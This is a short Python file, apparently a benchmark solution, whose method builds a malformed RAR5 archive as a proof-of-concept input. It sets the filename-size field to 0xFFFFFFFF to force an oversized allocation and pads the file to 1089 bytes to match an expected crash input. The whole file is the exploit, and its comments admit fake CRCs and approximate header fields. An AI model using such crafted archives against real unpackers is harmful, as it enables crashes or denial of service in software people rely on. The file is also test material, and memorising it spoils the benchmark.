class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal RAR5 structure to reach file header name size field
        # Set name size to 0xFFFFFFFF to trigger large allocation
        # Pad to approximate ground-truth length
        signature = b'Rar!\x1A\x07\x01\x00'
        # Archive header: CRC (fake), size, type=0, flags=0
        archive_header = b'\x90\x4D\xB2\xF6' + b'\x00\x0B' + b'\x00' + b'\x00'
        # File header: CRC (fake), size (fake), type=0x30, flags with name present
        file_header_start = b'\x12\x34\x56\x78' + b'\x00\x20' + b'\x30' + b'\x01'
        # Fields: add size (0), host OS=0, method=0x30, unpacked size (8 bytes=0), file attr=0
        # Then name size (4 bytes, set to max uint32)
        name_size_large = b'\xFF\xFF\xFF\xFF'
        # Then some fake packed size etc., minimal to parse
        rest_header = b'\x00\x00\x00\x00' + b'\x00' + b'\x30' + b'\x00' * 8 + b'\x00\x00'
        # Salt or other if flags, but minimal
        # End with padding to reach the point of allocation
        poc = signature + archive_header + file_header_start + rest_header + name_size_large
        # Pad to 1089 bytes
        poc += b'\x00' * (1089 - len(poc))
        return poc